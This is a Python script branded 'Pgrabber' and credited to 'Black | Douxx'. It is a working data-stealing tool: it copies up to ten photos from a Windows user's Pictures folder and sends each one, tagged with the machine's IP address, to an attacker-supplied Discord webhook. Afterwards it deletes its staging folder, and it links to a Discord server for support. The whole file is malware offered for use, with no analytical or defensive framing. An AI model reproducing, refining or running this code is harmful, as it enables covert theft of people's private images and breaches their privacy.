wh00k = 'YOUR_WEBHOOK_HERE'
import os
import shutil
import socket

def install_dep():
    import subprocess
    import sys
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'discord.py==1.7.3'])

install_dep()

import discord
from discord import File

def copy_photos_to_webhook(dest_folder_name, num_photos, webhook_url, webhook_name, webhook_avatar):
    host = socket.gethostname()
    ip = socket.gethostbyname(host)
    script_folder = os.path.dirname(os.path.abspath(__file__))
    photos_folder = os.path.join(os.getenv('USERPROFILE'), 'Pictures')
    dest_folder_path = os.path.join(script_folder, dest_folder_name)
    if not os.path.exists(dest_folder_path):
        os.makedirs(dest_folder_path)
    count = 0
    for filename in os.listdir(photos_folder):
        if count >= num_photos:
            break

        if filename.lower().endswith(('.jpg', '.jpeg', '.png')):
            src_path = os.path.join(photos_folder, filename)
            dest_path = os.path.join(dest_folder_path, filename)
            shutil.copy2(src_path, dest_path)
            count += 1

            client = discord.Webhook.from_url(webhook_url, adapter=discord.RequestsWebhookAdapter())

            embed = discord.Embed(title=':frame_photo: new photo has been founded on ' + ip + " :", color=discord.Color.dark_grey())
            embed.set_footer(text='Made by Black | Douxx', icon_url=webhook_avatar)
            embed.set_author(name="click here for help", url="https://discord.gg/YC9fZYknmB", icon_url=webhook_avatar)

            with open(dest_path, 'rb') as file:
                file = File(file, filename=filename)
                embed.set_image(url=f'attachment://{filename}')
                client.send(file=file, embed=embed, username=webhook_name, avatar_url=webhook_avatar)


    shutil.rmtree(dest_folder_path, ignore_errors=True)

copy_photos_to_webhook('PhotosCopiees', 10, (wh00k), 'Douxx | Pgrabber', 'https://zetaweb.odoo.com/web/image/360-649ca4c7/Capture%2520d%25E2%2580%2599%25C3%25A9cran%25202023-04-19%2520%25C3%25A0%252022.svg')
#CREATED BY BLACK | DOUXX
